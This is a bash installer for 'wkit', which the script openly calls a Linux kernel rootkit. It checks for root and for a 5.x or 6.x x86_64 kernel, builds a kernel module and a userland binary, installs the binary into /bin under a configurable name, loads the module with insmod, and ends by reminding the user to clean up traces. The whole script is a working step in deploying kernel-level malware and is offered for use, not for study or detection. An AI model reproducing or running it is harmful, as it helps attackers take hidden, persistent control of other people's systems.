#!/bin/bash
 
# wkit install/build script
# written by ngn (https://ngn.tf) (2024)

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

BOLD="\e[1m"
RESET="\e[0m"
RED="$BOLD\e[31m"
BLUE="$BOLD\e[34m"
YELLOW="$BOLD\e[33m"

info() {
  echo -e "${BLUE}=>${RESET}${BOLD} $1${RESET}"
}

err() {
  echo -e "${RED}=>${RESET}${BOLD} $1${RESET}"
}

warn(){
  echo -e "${YELLOW}=>${RESET}${BOLD} $1${RESET}"
}

check_ret() {
  if [ $? -ne 0 ]; then
    err "$1"
    exit 1
  fi
}

if [ "$EUID" != "0" ]; then
  err "No you can't install a rootkit without root"
  exit 1
fi

echo -e ${RED} "          _    _ _       "
echo -e ${RED} "__      _| | _(_) |_     "
echo -e ${RED} "\\ \\ /\\ / / |/ / | __| "
echo -e ${RED} " \\ V  V /|   <| | |_    "
echo -e ${RED} "  \\_/\_/ |_|\_\_|\__|   "
echo

info "Checking kernel version..."
majorver=$(uname -r | cut -d "." -f1)
if [ "$majorver" != "5" ] && [ "$majorver" != "6" ];
then
  err "Incompatible kernel version! ($(uname -r))"
  exit 1
fi

info "Checking architecture..."
if [ "$(uname -m)" != "x86_64" ];
then
  err "Incompatible architecture! ($(uname -m))"
  exit 1
fi

info "Running the config script..."
source conf.sh

info "Building the module..."
pushd module > /dev/null
  make -j$(nproc)
  check_ret "BUild failed!"
popd > /dev/null

info "Building userland binary..."
pushd user > /dev/null
  make -j$(nproc) 
  check_ret "Build failed!"
popd > /dev/null

info "Installing the userland binary..."
install -m755 user/bin /bin/${USUM}
check_ret "Install failed!"

info "Loading the module..."
insmod module/wkit.ko
check_ret "Load failed!"

info "Install completed, don't forget to cleanup"
